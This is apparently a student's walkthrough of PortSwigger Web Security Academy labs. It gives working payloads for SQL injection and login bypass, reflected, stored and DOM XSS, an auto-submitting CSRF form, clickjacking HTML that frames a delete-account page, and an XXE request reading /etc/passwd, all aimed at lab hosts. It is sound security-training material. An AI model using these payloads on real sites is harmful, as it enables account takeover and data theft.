# Burpsuite Academy

## SQLi

### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

We can exploit an SQLi in category search input: `' OR 1=1 -- `

The query will be interpreted as: `SELECT * FROM products WHERE category = '' OR 1=1 -- ' AND released = 1`

cleaning it up gives: `SELECT * FROM products WHERE category = '' OR 1=1`

### Lab: SQL injection vulnerability allowing login bypass

We can head to `/login` route, send `administrator' -- ` in the username field. We'll be logged in as administrator.

## XSS

### Lab: Reflected XSS into HTML context with nothing encoded

Performing a search in the website, we can see that our input is reflected. We try `<script>alert(1)</script>` as our search payload & we get an XSS.

### Lab: Stored XSS into HTML context with nothing encoded

We can go to a post's details page, scroll down & write a new comment. We use `<script>alert(1)</script>` for the comment body & anything for the rest of the other fields. Posting this comment creates a stored XSS.

This alert will be executed to anyone that opens the post details later on.

### Lab: DOM XSS in document.write sink using source location.search

**Description**: 
```
This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.
```

Examining the page's source code:

```html
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>
```

Well, that's our XSS. We can insert a `">` to break out of the `img` tag then inject our XSS payload. Full payload: `a"><script>alert(1)</script>`

## CSRF

### Lab: CSRF vulnerability with no defenses

**Description**: 
```
 This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter 
```

After logging in, we can change our own email address:

<p align="center">
  <img src="/img/img1.png"><br/>
</p>

First things first, we examine the request sent to update our email:

<p align="center">
  <img src="/img/img2.png"><br/>
</p>

Cleaning it up a little:

<p align="center">
  <img src="/img/img3.png"><br/>
</p>

For a CSRF, we can create a form with 1 input, `email`, that's sent to our lab url. Since there's no CSRF tokens, if we host this url in a website & send the url to a victim, this will successfully change their email.

Our form:

```html
<form id="f" method="POST" action="https://0ab00099034d0c18826d339700bc00bd.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@qa.team">
</form>
```

With a little JS, we can automatically submit the form:

```html
<script>
    window.f.submit();
</script>
```

We store our payload in exploit server (Or we can deploy our own), deliver the link to the victim.

## Clickjacking

### Lab: Basic clickjacking with CSRF token protection

**Description**:

```
This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: wiener:peter 
```

Simple, we'll create a website with 2 main components:
* Our fake website, the one that'll be visible to the victim.
* The target website, will be visibility hidden (using opacity), and placed on top of our fake website.

The user will see our fake page however, any clicks will be sent to the invisible iframe.

Our fake website:

<p align="center">
  <img width=500 height=500 src="/img/img4.png"><br/>
</p>

Code:

```html
<head>
  <style>
    #target_website {
      position:relative;
      width:400px;
      height:700px;
      opacity:0.5;
      z-index:2;
    }
    #decoy_website {
      position:absolute;
      top: 480px;
      left: 70px;
      width:300px;
      height:400px;
      z-index:1;
    }
  </style>
</head>

<body>
  <div id="decoy_website">
  <p>click</p>
  </div>
  <iframe id="target_website" src="https://0aa000c603d8752282c347e7009b00b5.web-security-academy.net  my-account">
  </iframe>
</body>
```

## XXE Injection:

### Lab: Exploiting XXE using external entities to retrieve files

**Description**:

```
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. 
```

XML input are parsed server-side & if not filtered properly, this can lead to potentially reading local server files.

The HTTP request sent to the server:

```http
POST /product/stock HTTP/2
Host: 0acc00d204844f538296a23f0080007f.web-security-academy.net
Cookie: session=ase0bdiizPQRn5zjRVowBhCCAJYSSt3G
Content-Length: 107
Content-Type: application/xml
Accept: */*

<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
    <stockCheck>
        <productId>
            3
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
```

Sending an invalid product id, reflects it back to us:

<p align="center">
  <img src="/img/img5.png"><br/>
</p>

So, we would go for injecting `/etc/passwd` content as our product id, which will obviously cause an error, and result in leaking the content of the file:

<p align="center">
  <img src="/img/img6.png"><br/>
</p>

Final payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE data [
        <!ELEMENT stockCheck ANY>
        <!ENTITY file SYSTEM "file:///etc/passwd">
    ]>
    <stockCheck>
        <productId>
            &file;
        </productId>
        <storeId>
            1
        </storeId>
    </stockCheck>
```
